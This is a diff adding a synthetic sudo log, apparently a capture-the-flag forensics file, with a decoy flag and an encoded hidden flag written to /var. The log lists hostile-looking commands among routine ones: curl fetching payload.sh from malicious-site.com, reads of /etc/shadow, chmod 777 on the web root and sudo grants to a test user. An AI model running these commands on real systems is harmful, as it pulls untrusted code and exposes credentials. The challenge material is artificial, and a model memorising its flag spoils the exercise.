@@ -1,0 +1,153 @@
+Mar 07 06:10:36 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:37:33 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:13:36 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+Mar 07 06:37:10 server sudo: service : TTY=pts/1 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+Mar 07 06:39:14 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:37:18 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:24:57 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:25:43 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:16:57 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/sudoedit /etc/hosts
+Mar 07 06:40:35 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:28:47 server sudo: admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:10:53 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:35:13 server sudo: service : TTY=pts/2 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/sudoedit /etc/hosts
+Mar 07 06:26:25 server sudo: service : TTY=pts/2 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:14:53 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:24:36 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:14:50 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:55:31 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:52:24 server sudo: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:28:15 server sudo: john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:33:28 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/python3 /home/user/script.py
+Mar 07 06:42:32 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:47:20 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:14:40 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:20:31 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:31:52 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:26:16 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
+Mar 07 06:42:30 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:32:56 server sudo: service : TTY=pts/2 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:54:39 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:53:36 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:12:34 server sudo: john : TTY=pts/3 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:50:22 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:25:38 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+Mar 07 06:50:35 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
+Mar 07 06:33:33 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:51:31 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:16:47 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:34:42 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/sudoedit /etc/hosts
+Mar 07 06:43:11 server sudo: john : TTY=pts/3 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:38:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:27:57 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:48:23 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/sudoedit /etc/hosts
+Mar 07 06:36:50 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:29:23 server sudo: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:20:38 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:13:19 server sudo: admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:17:54 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/rsync -avz /home/user /backup/
+Mar 07 06:29:57 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:30:39 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:14:30 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:17:36 server sudo: service : TTY=pts/2 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+Mar 07 06:18:14 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:11:32 server sudo: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/echo 'test' > /tmp/test.txt
+Mar 07 06:48:10 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:14:31 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:35:27 server sudo: john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:24:54 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/python3 /home/user/script.py
+Mar 07 06:16:14 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:18:57 server sudo: service : TTY=pts/5 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:10:49 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:27:59 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:15:24 server sudo: service : TTY=pts/1 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+Mar 07 06:47:49 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:22:46 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:54:32 server sudo: service : TTY=pts/2 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:14:17 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:41:56 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:50:24 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:53:45 server sudo: service : TTY=pts/5 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:21:35 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:45:26 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
+Mar 07 06:31:32 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
+Mar 07 06:16:47 server sudo: john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:32:45 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/bin/echo 'this is not the flag expX{ dont search for easyway 🤣😜'> /var/Flag.txt
+Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:11:42 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:34:38 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:26:35 server sudo: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
+Mar 07 06:32:45 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/bin/echo 'NjU3ODcwNTg3YjYyMzM3Mzc0NWY3NjMzNzI3MzMxNmY2ZTVmMzA2NjVm' > /var/.hidden_file1
+Mar 07 06:31:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
+Mar 07 06:33:48 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:22:24 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
+Mar 07 06:19:48 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
+Mar 07 06:49:34 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
+Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:11:42 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:14:17 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:41:56 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:50:24 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:53:45 server sudo: service : TTY=pts/5 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:21:35 server sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:45:26 server sudo: expX : TTY=pts/4 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/chown root:root /etc/shadow
+Mar 07 06:31:32 server sudo: root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
+Mar 07 06:16:47 server sudo: john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
+Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:38:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
+Mar 07 06:25:38 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-site.com/payload.sh
+Mar 07 06:16:57 server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:55:51 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/dd if=/dev/sda of=/backup.img bs=1M
+Mar 07 06:23:21 server sudo: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/html
+Mar 07 06:15:13 server sudo: expX : TTY=pts/2 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/tar -cvf backup.tar.gz /home/user
+Mar 07 06:50:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 07 06:58:55 server sudo: root : TTY=pts/5 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:16:28 server sudo: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo testuser
+Mar 07 06:31:17 server sudo: expX : TTY=pts/5 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Mar 07 06:14:24 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:22:24 server sudo: root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Mar 07 06:49:22 server sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/useradd testuser
+Mar 07 06:39:46 server sudo: expX : TTY=pts/1 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:10:28 server sudo: john : TTY=pts/5 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Mar 07 06:53:19 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt
+Mar 07 06:37:23 server sudo: expX : TTY=pts/3 ; PWD=/home/expX ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 07 06:34:52 server sudo: service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
